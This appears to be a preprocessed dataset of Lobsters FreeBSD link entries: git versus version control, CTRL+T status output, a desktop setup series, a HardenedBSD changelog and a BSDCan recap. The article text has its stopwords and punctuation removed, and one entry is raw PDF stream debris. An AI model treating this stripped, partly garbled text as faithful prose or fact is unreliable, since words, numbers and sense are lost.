emc nvmecontrol utility updated print full bit value smart data instead hexadecimal value nvmecontrol utility updated include control option western hgst drive new option capdiag getcrashdump drivelog purge purgemonitor dhclient utility updated compliant setting source address field ip header sending dhcprequest message attempt obtain previouslyassigned ip address sponsored dell emc pw utility updated allow character gecos field sponsored dell emc zfsd utility updated work type geom provider including md geli glabel gstripe sponsored spectrum logic p utility updated include jail keyword used list name jail instead numeric id utility added used manage connectx connectx device supported sponsored mellanox technology sysctl utility updated support setting array value node prior change sysctl could set one value node may return multiple value queried sponsored chelsio communication ifconfig utility updated include random option used ether option generates random mac address interface efibootmgr utility added used manipulate efi boot manager sponsored netflix etdump utility added used view el torito boot catalog information mount utility updated allow fallback mount medium readonly attempt mount writeprotected medium readwrite fails behavior disabled default requested new autoro option makefs utility updated default block fragment size match newfs respectively sponsored freebsd foundation pwdmkdb utility updated emit notice legacy database support removed effective freebsd l flag used sponsored freebsd foundation dhclient utility updated allow interfacemtu option overridden supersede entry dhclientconf contributed softwarethe libarchive library updated version subversion updated version dtc utility updated upstream commit file utility updated version openssh updated version mandoc utility updated version tcpdump utility updated version ntp utility updated version le utility updated upstream version bmake utility updated upstream version bsdlicensed diff utility imported openbsd installed withoutgnudiff set srcconf otherwise installed default openssl updated version clang llvm lld lldb compilerrt utility well libc updated upstream version timezone data file updated version libxo library updated version
354,Lobsters,freebsd,FreeBSD,Git Is Not Revision Control,https://blog.feld.me/posts/2018/01/git-is-not-revision-control/,git revision control,git koan,git always rubbed wrong way ability rewrite history tracking file renames reason turned sour mention awful inconsistent ux brilliantly mocked git koan objective enough come solid case git revision control system freebsd developer email phk resonated enough flagged reread many time last year internal discussion possible merit switching git increase user contribution brilliant response published permission sun feb poulhenning kamp wrote fundamentally wrong ask svn git svn obviously version control system classic attribute one including crucial element progressing version number definitive timeline imutability git clearly vcs never tried one people calling one nt change absense progressing version number lack definitive timeline mention many unnatural act git repo sufficient argument settle point git something else colaboration tool git tool allows people project manage modify fork merge many different view instance variation modification work progress across barrier distrust crucial word many different exact opposite vcs strives lot feature git provides feature make great colaboration tool fly face directly invalidates guarantee normally expect vcs notably progression time version immutability consistency view many case git adequate substitute vcs augment outofband definition tree definitive settle get define version mean github exists first place freebsd insisted proper version control day one year ago decision revisit periodically everytime come overwhelmingly confirmed way thing thread far first subject fails converge one side desire better colaboration tool side willing give good oldfashioned version control get party failing realize neither svn git ever able requirement fundamentally different conflict task hand still one ask make easier use git colaboration tool committers downstream user poulhenning p good place start would bless github mirror make sure pull request get dealt http githubcomfreebsdfreebsdpulls poulhenning kamp unix since zilog zeus phk nospamplz tcpip since rfc freebsd committer bsd since never attribute malice adequately explained incompetence originally intended cite specific point made email honestly good publish entirety impossible refute line reasoning opinion
355,Lobsters,freebsd,FreeBSD,The Power of CTRL+T,https://blog.danielisz.org/2018/06/21/the-power-of-ctrlt/,power ctrlt,load cmd ping select packet received min avg max feld,know check process pressing ctrlt happened waiting something finished take lot time easy way check status like dd cp mv many others press ctrlt process running output happening interrupt mess way cause operating system output siginfo signal freebsd look like ping pingtestcom ping pingtestcom data byte byte m byte m byte m byte m byte m load cmd ping select packet received min avg max byte m byte m see output name running command following parameter well pid since process running user time system time cpu usage resident set size process r even better example following cp command cp devnull load cmd cp runnable devnull load cmd cp runnable devnull load cmd cp runnable devnull load cmd cp runnable devnull load cmd cp runnable devnull load cmd cp runnable devnull prcessed ctrlt six time without output would first line another example process changing state wget http http resolving downloadfreebsdorg downloadfreebsdorg connecting downloadfreebsdorg downloadfreebsdorg connected http request sent awaiting ok length applicationoctetstream saving eta cmd wget waiting eta cmd wget waiting eta load cmd wget running eta cmd wget waiting eta bad news ctrlt work linux kernel use macososx fetching distfiles gmp attempting fetch http distfilesmacportsorggmp verifying checksum gmp extracting gmp applying patch gmp configuring gmp load cmd clang running p recall correctly feld showed ctrlt thank
356,Lobsters,freebsd,FreeBSD,KDE on FreeBSD – June 2018,https://euroquis.nl/bobulate/?p=1915,kde freebsd june,,
357,Lobsters,freebsd,FreeBSD,FreeBSD Desktop - Part 10 - Key Components - Locking Solution,https://vermaden.wordpress.com/2018/06/23/freebsd-desktop-part-10-key-components-locking-solution/,freebsd desktop part key component locking solution,locking solution locking solution freebsd desktop global page keyboardmouse shortcut matescreensaver xlock xautolock matescreensaver xlock xlock matescreensaver matescreensaver xlock xautolock matescreensaver xlock matescreensaver matescreensaver matescreensaver xinitrc xsession matescreensavercommand lock matescreensaver xlock clean fixed xlock clean xlock mode blank planfont clean font clean username username password password background dpmsoff message info xautolock xautolock time locker binexamplelockhandlersh resetsaver xautolock xinitrc xsession update nice looking configuration like,part freebsd desktop series would like describe key component self made custom desktop environment window manager status bar task bar wallpaper handling application launcher keyboardmouse shortcut locking solution blue light spectrum suppress today focus sixth part locking solution next series component configuration would also described along eventual needed script may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content screen locking feature obvious popular operating system like mac o x macos window complete desktop environment kde plasma build desktop environment ground similarly like part keyboardmouse shortcut describe light solution work instead focusing available solution choosing best one tool embrace process matescreensaver xlock xautolock role matescreensaver xlock redundant keep xlock fallback matescreensaver fail reason example upgrade library may available present different version filename matescreensaver fail xlock take role securely lock screen xautolock used automatically lock screen invoke matescreensaver xlock command defined period inactivity time example would forgot lock screen left laptop open world matescreensaver nice looking solution providing screen lock found matescreensaver best choice task default display fancy screensaver plain old blank screen good laptop save battery time matescreensaver started run background well matescreensaver command placed somewhere xinitrc xsession file would able invoke matescreensavercommand lock command make actual screen lock xlock matescreensaver available functional use xlock failover solution pretty support freetype font clean fixed font face bad either quite nice usable bitmap font xlock tool appearance configured specifying argument find example configuration gray background clean bitmap font xlock mode blank planfont clean font clean username username password password background dpmsoff message info look configuration xautolock addressed demand screen locking case also need make sure screen automatically lock period time away computer small utility called xautolock exactly efficiently example invocation presented xautolock time locker binexamplelockhandlersh resetsaver xautolock also started run background using xinitrc xsession file update nice looking xlock configuration messing xlock little found way make look lot better one reason use xlock may matescreensaver memory footprint xlock us mb ram matescreensaver us time seen freebsd top command output pid username thr pri nice size re state c time wcpu command vermaden select matescreensaver vermaden select xlock mb ram entire openbox desktop stack pid username thr pri nice size re state c time wcpu command root select xorg vermaden select matescreensaver vermaden select openbox vermaden select vermaden select vermaden select xlock root wait xdm vermaden nanslp redshift root pause xdm vermaden select xbindkeys new locking script available github page openboxlocksh new xlock config along new readable fixed font font fixed xlock mode image planfont font font font username user password pas info validate checking invalid nope background foreground dpmsoff icongeometry echokeys echokey bitmap homevermadeniconsvermadenxlockxpm count delay erasemode nofade showdate description used bitmap also available github page xlockxpm logo black background may course use imagelogo black background screen locked xlock look like image also quite fast dpms mode mean turned screen battery life want enter password unlock screen look like liked much disabled matescreensaver entirely eof like like loading related
358,Lobsters,freebsd,FreeBSD,FreeBSD Desktop - Part 9 - Key Components - Keyboard/Mouse Shortcuts,https://vermaden.wordpress.com/2018/06/22/freebsd-desktop-part-9-key-components-keyboard-mouse-shortcuts/,freebsd desktop part key component keyboardmouse shortcut,keyboardmouse shortcut keyboardmouse shortcut freebsd desktop global page keyboardmouse shortcut alt ctrl super scroll lock pause break xev xmodmap xbindkeys xdotool xev xev page page prior next xmodmap page page xmodmap xev xmodmap xmodmap pm xmodmap xinitrc xsession xbindkeys alt ctrl super xbindkeys xev xev xbindkeys xbindkeys xbindkeys xinitrc xsession xbindkeys xev k key mk multikey xbindkeys k xdotool deadbeef next xdotool z shift z mupdf summary like,part freebsd desktop series would like describe key component self made custom desktop environment window manager status bar task bar wallpaper handling application launcher keyboardmouse shortcut locking solution blue light spectrum suppress today focus sixth part keyboardmouse shortcut next series component configuration would also described along eventual needed script may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content keyboardmouse shortcut window manager desktop environment offer kind shortcut tool define one often quite complicated force exactly want example openbox support creating keyboard mouse shortcut always require modifier key like alt ctrl super example also allow create mouse shortcut like using left button mouse wheel confuse regular left mouse button add function script key like scroll lock pause break without modifier fortunately tool work well together achieve almost anything imagine earlier series made knockout solution choosing best one several potential candidate part different use tool knockout provide missing bit openbox probably window manager tool xev xmodmap xbindkeys xdotool xev xev used read keyboard key pressed mouse button used may sound stupid key special one like volume volume dedicated button many laptop page page key named prior next respectively xmodmap tool used assign rename key make something different example lenovo thinkpad laptop two special key let call forward backward near arrow key work lot better page page key xmodmap possible map way popular use case laptop volume volume button volume mute button checked xev often keycode attached may map respectively take care rest start work application thanks mapping additional scripting needed example modifier map shown xmodmap tool xmodmap pm xmodmap key per modifier keycodes parenthesis shift shiftl shiftr lock capslock control controll controlr altl metal numlock superl superr superl hyperl modeswitch xmodmap load map key exit file like xinitrc xsession good place startup keyboard setup xbindkeys window manager including openbox support configuring keyboard shortcut perfect limitation like requiring modifier key like alt ctrl super used every shortcut example xbindkeys step xev case fail advanced scenario example would like attach volume volume action mouse left wheel button right wheel button key probably able express useful mapping even laptop screen locked able turn volume similarly like xev xbindkeys come window catch event binding xbindkeys mixer pcm mixer vol mouse mixer pcm mixer vol mouse xbindkeys run daemon background file like xinitrc xsession usual place start environment start xbindkeys tool also come key identifier xev use k key argument identify one key pressed mk multikey argument identify multi key pressed respectively xbindkeys k press combination key orand click window use one two line nocommand homexbindkeysrc bind key scheme function prior xdotool sometimes want fake key pressed without pressing without touching keyboard application offer setting changed argument main binary name like example deadbeef medium player allows type deadbeef next skip next song many application provide api xdotool come handy generate keyboard shortcut send application environment great tool scripting automating work desktop also situation nothing else work example useful shortcut may emulating z shift z combination key press mupdf pdf viewer zoom page fit either width height window opening new pdf document summary tool play role keyboard mouse shortcut desktop together able execute solution imagine eof like like loading related
359,Lobsters,freebsd,FreeBSD,FreeBSD Desktop - Part 8 - Key Components - Application Launcher,https://vermaden.wordpress.com/2018/06/21/freebsd-desktop-part-8-key-components-application-launcher/,freebsd desktop part key component application launcher,application launcher application launcher freebsd desktop global page application launcher resource pid username thr pri nice size re state c time wcpu command dmenu alc rofi rofi show run theme solarizedalternate font monaco alc site like,part freebsd desktop series would like describe key component self made custom desktop environment window manager status bar task bar wallpaper handling application launcher keyboardmouse shortcut locking solution blue light spectrum suppress today focus fifth part application launcher next series component configuration would also described along eventual needed script may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content application launcher crucial role desktop environment us sometimes save time hard add feature setup evaluate two light fast solution fulfill role resource let start resource rofi implementation application launcher us almost time ram mb dmenu solution mb pid username thr pri nice size re state c time wcpu command vermaden select dmenu vermaden select rofi dmenu also faster rofi eye candy color dmenu dmenu suit better minimalist yet functional desktop use instead rofi feel free experiment choose best option dmenu setup run cover status bar filtered command fitting nicely setup look action desktop without dmenu launched desktop dmenu launched alc character inserted filter command search calculator application rofi dmenu good job let look rofi behaves role use custom script dmenu present later series rofi requires simple command rofi show run theme solarizedalternate font monaco rofi look action record also entered alc character rofi filter command search calculator application dmenu narrow specialization rofi also used scenario described project site eof like like loading related
360,Lobsters,freebsd,FreeBSD,FreeBSD Desktop - Part 6 - Key Components - Task Bar,https://vermaden.wordpress.com/2018/06/21/freebsd-desktop-part-6-key-components-task-bar/,freebsd desktop part key component task bar,task bar task bar freebsd desktop global page task bar wikipedia classic dock virtual desktop resource pid username thr pri nice size re state c time wcpu command result like,part freebsd desktop series would like describe key component self made custom desktop environment window manager status bar task bar wallpaper handling application launcher keyboardmouse shortcut locking solution blue light spectrum suppress today focus third part task bar next series component configuration would also described along eventual needed script may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content task bar quote wikipedia taskbar element graphical user interface various purpose typically show program currently running dozen option using many narrowed choice lighter solution xfce panel fbpanel lxpanel plank classic use classic taskbar like xfce panel used xfce desktop environment also configure way solution drawback show application active current desktop using virtual desktop standard power user knowing happening desktop acceptable dock one greatest taskbars time wasis mac o x dock macos dock also cover virtual desktop feature show application desktop click application icon switch application desktop also indicator showing application launched also help time could use fbpanel create pixelperfect clone mac o x dock without feature course still unfortunately worked till version fbpanel later release pixelperfect custom theme possible forced spacing element look like fbpanel development stopped somewhere currently best lightest solution providing docklike functionality open desktop seems plank dock originally written elementary o linux distribution besides light nice look also offer important feature original mac o x dock like switching application showing indicator already running application original plank theme used elementary o look like quite nice take definitely much desktop space thus prefer configure little lean way also styled along colorsstyle virtual desktop one best solution let forget one nicest feature small beauty configure show application virtual desktop even provide separate launcher system tray many useful thing use clock already status bar example configured way find usable efficient either way habit window like desktop system die hard lxpanel also launcher needed functionality flexibility offer lxpanel low resource taskbar us even le mention lxpanel historical reason used past resource let compare solution system resource omitted fbpanel longer usable taskbar solution pid username thr pri nice size re state c time wcpu command vermaden select plank vermaden select vermaden select vermaden select lxpanel take mb ram plank taking little mb ram usability nice look justified take little result final result along status bar top along virtual desktop overview plank running bottom look like plank taskbar bottom optional got used setup top plank became optionalredundant people prefer desktop usage pattern eof like like loading related
361,Lobsters,freebsd,FreeBSD,Inside the Mac OS X Kernel (2007),https://events.ccc.de/congress/2007/Fahrplan/attachments/1053_inside-macosx-kernel.pdf,inside mac o x kernel,,obj length r filter flatedecode stream gbbdb ic endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf text imageb imagec imagei colorspace r r font r xobject r r endobj obj length r type xobject subtype image width height colorspace r interpolate true intent perceptual bitspercomponent filter dctdecode stream jfif h h mm b j h h adobe photoshop c macintosh h h jfif h h adobecm adobe x mkj c mkj c mkj c mkj c mkj ķ ķ j comappleprintpageformatpmhorizontalres comappleprintticketcreator comappleprintingmanager comappleprintticketitemarray comappleprintpageformatpmhorizontalres comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintpageformatpmorientation comappleprintticketcreator comappleprintingmanager comappleprintticketitemarray comappleprintpageformatpmorientation comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintpageformatpmscaling comappleprintticketcreator comappleprintingmanager comappleprintticketitemarray comappleprintpageformatpmscaling comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintpageformatpmverticalres comappleprintticketcreator comappleprintingmanager comappleprintticketitemarray comappleprintpageformatpmverticalres comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintpageformatpmverticalscaling comappleprintticketcreator comappleprintingmanager comappleprintticketitemarray comappleprintpageformatpmverticalscaling comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintsubticketpaperinfoticket comappleprintpageformatpmadjustedpagerect comappleprintticketcreator comappleprintingmanager comappleprintticketitemarray comappleprintpageformatpmadjustedpagerect comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintpageformatpmadjustedpaperrect comappleprintticketcreator comappleprintingmanager comappleprintticketitemarray comappleprintpageformatpmadjustedpaperrect comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintpaperinfopmpapername comappleprintticketcreator comappleprintpmpostscript comappleprintticketitemarray comappleprintpaperinfopmpapername naletter comappleprintticketclient comappleprintpmpostscript comappleprintticketmoddate comappleprintticketstateflag comappleprintpaperinfopmunadjustedpagerect comappleprintticketcreator comappleprintpmpostscript comappleprintticketitemarray comappleprintpaperinfopmunadjustedpagerect comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintpaperinfopmunadjustedpaperrect comappleprintticketcreator comappleprintpmpostscript comappleprintticketitemarray comappleprintpaperinfopmunadjustedpaperrect comappleprintticketclient comappleprintingmanager comappleprintticketmoddate comappleprintticketstateflag comappleprintpaperinfoppdpmpapername comappleprintticketcreator comappleprintpmpostscript comappleprintticketitemarray comappleprintpaperinfoppdpmpapername u letter comappleprintticketclient comappleprintpmpostscript comappleprintticketmoddate comappleprintticketstateflag comappleprintticketapiversion comappleprintticketprivatelock comappleprinttickettype comappleprintpaperinfoticket comappleprintticketapiversion comappleprintticketprivatelock comappleprinttickettype comappleprintpageformatticket x h h h h h h h
362,Lobsters,freebsd,FreeBSD,Is FreeBSD faster than Linux?,https://www.quora.com/Is-FreeBSD-faster-than-Linux,freebsd faster linux,,please enable javascript refresh page continue
363,Lobsters,freebsd,FreeBSD,FreeBSD Celebrates 25th Anniversary (since 1993/06/19),https://www.freebsdfoundation.org/national-freebsd-day/,freebsd celebrates anniversary since,freebsd howto guide send u foundation,pleased announce june declared freebsd day join u honoring freebsd project pioneering legacy continuing impact technology freebsd opensource operating system developed university california berkley used billion people around globe freebsd used teach operating system concept university company also develop product freebsd university use research platform fact good chance already using least code derived freebsd everyday life example stream movie via netflix chat friend whatsapp play latest playstation game sensation already using freebsd pioneer opensource technology freebsd modified redesigned meet need user free charge within guideline license june day official name freebsd agreed upon see part email thread love freebsd much help u celebrate anniversary favorite open source operating system following love freebsd much help u celebrate favorite open source operating system following introduce someone freebsd showing freebsd howto guide freebsd virtual box setting minecraft server number thing learn aboutmore history freebsd herehelp promote day sharing graphic social medium send u story company us freebsd great successtell u love freebsd using freebsdday facebook twitter instagram postsconsider donating foundation help u continue support project look forward commemorating anniversary favorite open source operating system june hope join u
364,Lobsters,freebsd,FreeBSD,FreeBSD Desktop - Part 5 - Key Components - Status Bar,https://vermaden.wordpress.com/2018/06/16/freebsd-desktop-part-5-key-components-status-bar/,freebsd desktop part key component status bar,status bar status bar freebsd desktop global page status bar xmobar user pid cpu mem vsz r tt stat started time command pid username thr pri nice size re state c time wcpu command mkfifo like,part freebsd desktop series would like describe key component self made custom desktop environment window manager status bar task bar wallpaper handling application launcher keyboardmouse shortcut locking solution blue light spectrum suppress today focus second part status bar next series component configuration would also described along eventual needed script may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content status bar also known information bar place screen would provide needed information current date time cpu ram storage usage current network information battery status function done dozen open source solution limit fast low resource one list potential solution contains conky xmobar polybar tested conky seems best solution finally settled various reason describe moment xmobar nice solution come gb dependency haskell haskell library keeping disk run tiny status bar seem sensible light example xmobar action polybar look nice screenshots lot heavy resource limited modulesfeatures implemented advanced polybar setup also polybar us almost three time ram use similarly cpu time user pid cpu mem vsz r tt stat started time command vermaden polybar vermaden left u conky used conky quite long time recent test made lot le resource conky thing even important measure battery time laptop interval exactly look output using external script laptop would run using conky run running almost minute battery time feature enough switch pid username thr pri nice size re state c time wcpu command vermaden select conky vermaden select course want plot gauge cpu ram possibly bar filesystems usage conky provides feature use text present information provides similar feature lower footprint example conky setup also offer feature conky offer would like implement refresh interval second example often also refresh information everytime click status bar action possible implement using mkfifo command possible achieve conky anyone would want implement strange refresh policy get battery life often need information one one second behind reality refresh every second need refresh manually needed information reason focus status bar refreshes every second cache attention may prevent focusing deep enough task currently something important requires focus want status bar anything else distract useless moment information configured similarly conky xmobar eof like like loading related
365,Lobsters,freebsd,FreeBSD,HardenedBSD 11-STABLE v1100055.4 Released,https://hardenedbsd.org/article/op/2018-06-14/stable-release-hardenedbsd-stable-11-stable-v11000554,hardenedbsd released,http githubcomhardenedbsdhardenedbsdstablereleasestaghardenedb highlight installer image http changelog oliver pinter ae brook cy davidcs delphij dim dteske eadler ed emaste gjb gonzo hselasky ian imp jhb jtl ken kib kp manu marius markj mav mjg np pfg ram rmacklem royger sbruno shurd trasz tuexen,http githubcomhardenedbsdhardenedbsdstablereleasestaghardenedb highlight mfc enable eager fpu context switch default freebsdsacandidate mfc enable ibrs entering interrupt handler usermode freebsdsacandidate mfc add intel spec store bypass disable control freebsdsacandidate mfc syslog master mfc perform compare caseinsenstive mfc fix slow leak session structure server mfc mfv xz mfc phil import mfc lock primitive update mfc flush cache initiating microcode update intel cpu mfc fix pcidpti pmap operation xenhvm mfc implement support ifuncs kernel linker mfc remove pgu recursive pte kernel pmap page rest kernel pmap ptes mfc set pgg global mapping bit trampoline ptes mfc optimize context switch pti pcid pmap pf update update linuxkpi update sctp update nfs update dwatch update installer image http begin pgp signature blbu end pgp signature changelog oliver pinter merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch merge branch ae mfc immediately propagate eacces error code application tcpoutput mfc fix printing rule comment mfc apply change ifipsec interface mfc remove check matching rulenum ruleid rule pointer dynlookupipv statelocked check remnant ready committed code accident due race check lead creating duplicate state concurrent thread time try add state two packet flow reverse direction matched different parent rule mfc add ifcaplinkstate support ifloop mfc bring last change implementation mfc remove empty encapinit function mfc use mcopyback function write delayed checksum nt located first mbuf chain mfc explicitly change link state assingn address brook cy mfc davidcs mfc upgraded fw related file version delphij mfc mfc mfc mfv xz dim mfc mfc mfc fix build si base gcc mfc dteske mfc svn dtrace enhancement mfc svn dwatch touchups mfc dwatch update manual reference actual release eadler mfc indent known incomplete incorrect way since code planned mfc remove failing test mfc ed mfc emaste mfc switch memstick installer image mbr mfc add deprecation notice lmc gjb rename prerelease part cycle create hard link bananapidtb fix boot failure banana pi soc mfc add special gcelicense variable makefilegce set include license metadata resultant gce image document bsdlicensed diff imported openbsd document dtc update upstream document du si option document getconf flag addition document rgrep hard link addition document various bsdgrep pattern matching fix bump copyright year document lint longer built installed default document top enhancement filter multiple user name document indent support simplebackupsuffix environment variable also used patch document etdump utility addition document hybrid iso image document mount autoro option addition document makefs default block fragment size synced newfs document pwdmkdb deprecation notice legacy l mode used document tzdata version mfc imp need make object document cm fpa deprecation freebsd document various geom class deprecation freebsd document ixgb deprecation freebsd document nxge deprecation freebsd document lmc deprecation freebsd document vxge deprecation freebsd expand description noting iso image used write memory stick well cd document memory stick installer image use mbr update part cycle revert renames order address issue discovered build mfc update part cycle update part cycle mfc mfc phil import add xoformatisnumeric improved logic decide format string numeric json output quote convert doc sphinxrst update test rename back prerelease duration cycle branched fix freebsdversion following revert switch default pkg repository latest quarterly branched mfc use vyyyymmdd timestamp suffix google compute engine snapshot image consistency os gonzo mfc mfc hselasky mfc fix missing network interface address event adding default based linklocal address mfc add support setting type service tos outgoing rdma connection krping kernel test utility mfc add function wait usb ethernet attach complete mfc allow taskparked bit set going sleep linuxkpi mfc implement waiteventkillable linuxkpi mfc scheduletimeoutkillable function listen signal linuxkpi mfc mfc correct argument evdevpushrel mfc implement idrisempty linuxkpi make idrremove api compatible upstream linux returning pointer removed element mfc implement bitmapcomplement linuxkpi mfc define initconst linuxkpi mfc correct macroname linuxkpi mfc implement support kvmallocarray function linuxkpi mfc implement support pcibusnum function macro linuxkpi ian mfc imp mfc launch getty underlying device exists jhb mfc fix atomic cmpset arm mfc make common interrupt entry point label local label jtl attempted make shutdown posix compliant returning enotconn shutdown called unconnected socket change slightly modified return enotconn case unconnected datagram socket still run shutdown code socket specifically support case userspace code using shutdown call wakeup another thread blocked socket ken mfc ken fri may line kib mfc always allow vlan id mfc optimize context switch pti pcid pmap mfc set pgg global mapping bit trampoline ptes mfc add test program examine cpu behaviour pop s issue handle difference head test build direct commit mfc remove dead declaration mfc procpdeathsigctl appear first mfc remove pgu recursive pte kernel pmap page rest kernel pmap ptes mfc implement support ifuncs kernel linker mfc add helper macro hide boring repeatable ceremony define ifuncs mfc add test mfc style mfc fix ibrs handling around mwait mfc fix pcidpti pmap operation xenhvm mfc preserve bit msr changing ibrs stibp state mfc add definition intel speculative store bypass disable msr bit mfc add intel spec store bypass disable control mfc fix build mfc note ptsetstep autocleared mfc add missed barrier pmgenpmactive interaction mfc enable ibrs entering interrupt handler usermode mfc add implementation clog clogf clogl mfc implement printf family format string extension mfc enable eager fpu context switch default kp manu marius mfc mfc mfc phil mfc mfc akin head synchronize build stripping image bootonly image similarly modulo game groff image overflowing also remove redundant mklldb mfc cem markj mfc flush cache initiating microcode update intel cpu mfc avoid dropping topology lock gmirror dumpconf implementation mfc document return value sbufbcat mfc dtrace avoid calling unwindframe probe context mfc override locale file list get consistent sort order mfc typo mfc add getstackusage mfc remove inaccuracy mfc nt export end riscv mav mfc clean enclosuretable resetting numenctableentries zero mjg mfc np mfc mfc pfg mfc msdosfs long name file created incorrectly mfc msdosfs use vfstimestamp generate timestamps instead getnanotime ram mfc included optstackh makefile fix module build outside kernel build environment issue utility hang ocsioctlcmdmgmtgetall called parallel port port rmacklem mfc fix eirserverscope reply argument exchangeid mfc fix sleep event layout recall mfc strengthen locking server destroysession operation mfc fix slow leak session structure server royger mfc xenblkback use state sbruno mfc mfc mfc mfc cam iosched add handler quantum sysctl enforce valid value activate wake lan feature ice lake cannon lake device mismerged broke kernel option camioscheddynamic shurd mfc mfc trasz tuexen mfc mfc mfc mfc mfc mfc mfc mfc mfc mfc
366,Lobsters,freebsd,FreeBSD,FreeBSD Desktop – Part 4 – Key Components – Window Manager,https://vermaden.wordpress.com/2018/06/15/freebsd-desktop-part-4-key-components-window-manager/,freebsd desktop part key component window manager,window manager window manager freebsd desktop global page window manager tilesh pytyle ewmh icccm window manager year axonkolorish mint twm violetgrey resource pid username thr pri nice size re state c time wcpu command configuration update window switching behavior pekwm http workspace menu proper icon rendering working area action window barborder standard language command subshell like,next part freebsd desktop series would like describe key component self made custom desktop environment window manager status bar task bar wallpaper handling application launcher keyboardmouse shortcut locking solution blue light spectrum suppress make post huge today article would focus first component window manager next series component configuration would also described along eventual needed script may want check article freebsd desktop series freebsd desktop global page find link episode series along table content episode content window manager use openbox already installed previous part series openbox something else exact answer make feel best possible choice argument good official documentation lot online materialshowtosblogs used window manager many desktop environment fast low resource written c language support tiling external utility like tilesh pytyle fully compliant ewmh extended window manager hint standard fully compliant icccm interclient communication convention manual standard allows generating dynamic menu script chosen window manager year linuxquestionsorg member choice award vote vote vote vote look really awesome several example axonkolorish openbox theme mint openbox theme twm openbox theme violetgrey openbox theme may also want check category linuxquestionsorg member choice award last year may find solution application never knew existed resource openbox memory usage system mb ram total cpu usage also low second one day using system along suspendresume usage pid username thr pri nice size re state c time wcpu command vermaden select openbox configuration describe possible openbox configuration option future series would contain setup seems work best daily use least would like increase knowledge openbox check official documentation online resource somehow find openbox usable try fluxbox pekwm used fluxbox year also served well time update someone told moved fluxbox openbox used pekwm also similar concept small thing pretty annoying one difference openbox fluxbox pekwm wrote around year later still true mostly icon scaling margin desktop openbox offer small thing openbox configuration xml pain beginning window switching behavior proper alttab behavior available fluxbox openbox pekwm lack lot check information http fluxbox switch window instantly openboxpwkwm show list window switching openbox also show blackwhite border highlight every window like metacity gnome workspace menu socalled workspace menu fluxbox expands submenu workspace make useless fast general usage pekwmopenbox provide workspace menu show apps workspace instantly without submenu openbox render application icon properly proper icon rendering pekwmfluxbox render application icon properly openbox fluxbox render properly icon root menu select exact size icon actual image size image bigger scaled version would ugly even downsized pretty large working area openboxpekwm set margin workspace space side used window achieve fluxbox use dome dockapp displaying transparent png file dirty hack maximize slit option one side desktop like action window barborder pekwmopenbox define various action happen clickingscrolling window borderbar custom command like transparency increasingdecreasing transsetdf command fluxbox offer standard pekwmfluxbox fully compliant netwmemwh openbox never suffered fact fully compliant language pekwm fluxbox written c openbox written c make little faster probably hard notice core duo class machine pekwmfluxbox support tab window remember last used two fluxbox also offer taskbar frank must say nice workspace menu openbox need taskbar command subshell put something subshell fluxbox root menu fluxbox execute without problem openbox throw error checked pekwm alternative syntax thought difference three wms eof like like loading related
367,Lobsters,freebsd,FreeBSD,BSDCan 2018 Recap,https://www.ixsystems.com/blog/bsdcan-2018-recap/,bsdcan recap,bsdcan recap blog tradeshow event bsdcan goat bgp ansible pf libressl contempt culture faster clone deletion zfs dwatch interface dtrace ssh key management trueos difference freebsdvps raidz expansion bootstrapping bsdtw conference freebsd new environment zstandard compression zfs openbsd xray surprise talk theo de raadt openzfs replication zrepl openzfs replication evolution freebsd governance michael dexter senior analyst,bsdcan recap jun blog tradeshow event annual bsdcan took place first week june saw record attendance user developer around world including many member ixsystems team honor sponsor saturday night social event part north america largest bsd conference bsdcan special starting connecting airport around world ending informally cafe around byward market ottawa celebrating year bsdcan tied bsdcan record number attendee made busy never crowded event hallway track always important session track choosing concurrent session miss deciding eat probably two difficult decision bsdcan attendee face first bsdcan social event goat bird feather session royal oak weary traveller could unwind catch colleague rarely pleasure seeing person mildly rested acclimated attendee speaker started next day mix tutorial freebsd developer summit last minute presentation preparation freebsd devsummit featured highly constructive discussion proposed feature like openrc init system packaged base undergoing evaluation trueos consideration inclusion freebsd project ranked remarkably well balancing technological innovation without violating principle least astonishment pola regard change user experience tutorial provided handson introduction bgp ansible pf libressl kicking first talk day bsdcan keynote tragedy systemd benno rice observed community member often foster contempt culture inadvertently discouraging participation project declaring superior others also argued case systemd adequatelylarge technological innovation must take priority user experience highlight many talk followed include sara hartse talk faster clone deletion zfs devin teske amazing dwatch interface dtrace ssh key management michael w lucas trueos difference ken moore freebsdvps cloud infrastructure bhyve sean chittenden followed perennial question eat highlight day two talk included matt ahrens update raidz expansion liwen hsu experience bootstrapping bsdtw conference baptiste daroussin experience freebsd new environment allan jude update zstandard compression zfs henning brauer experience openbsd xray machine surprise talk theo de raadt intel cpu vulnerability tour calvin hendryxparker six foot replaced complex filelevel backup tool like bacula openzfs replication highlight famous bsdcan auction introduction zrepl openzfs replication tool christian schwarz evolution freebsd governance dr kirk mckusick sheer variety content overwhelming lot watch video one talk people invariably missed armed vast amount new information digest eased bsdcan auction social event soften collective return routine back home supporting ottawa mission bsdcan auction famous success also humor auction item included signed shirt unique edition book michael w lucas several last chocolate chip cooky cad bill finally photography right henning brauer openbsd developer wearing systemd tshirt antic continued red lion public house raised total cad mission social event gave u final opportunity group discussion laugh reluctant departure despite scattering next morning many u met cafe airport lounge airplane another informal day bsdcan attended 